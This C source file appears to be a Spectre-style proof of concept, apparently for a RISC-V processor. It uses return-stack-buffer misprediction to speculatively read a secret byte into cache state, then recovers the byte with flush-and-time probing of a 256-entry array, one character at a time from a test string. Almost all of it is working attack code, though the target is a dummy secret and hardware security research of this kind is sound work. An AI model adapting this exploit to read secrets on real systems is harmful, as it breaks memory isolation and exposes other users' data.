#include <stdio.h>
#include <stdint.h>
#include "cache.h"
#include "encoding.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#ThisIsTheBabyBoomerTest";

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

/**
 * function to read in the attack array given an attack address to read in. it does this speculatively by bypassing the RSB
 *
 * @input addr passed in address to read from
 */
void specFunc(uint64_t addr){
    //printf("started specFunc\n");
    extern void frameDump();
    uint64_t dummy = 0;
    frameDump();
    dummy = attackArray[(*((uint8_t*)addr)) * L1_BLOCK_SZ_BYTES]; 
    dummy = rdcycle();
    //printf("finished specFunc\n");
}

int main(void){
    uint64_t start, diff;
    uint8_t dummy = 0;
    static uint64_t results[256];

    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
        
        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            //printf("start attack\n");

            // flush the array that will be probed
            flushCache((uint64_t)attackArray, sizeof(attackArray));

            //printf("flushed attackarray\n");

            // run the particular attack sequence
            specFunc((uint64_t)secretString + offset);

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                start = rdcycle();
                dummy &= attackArray[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }

            //printf("finished results\n");
        }

        //printf("finished rounds\n");

        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(secretString + offset), hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
    }
}
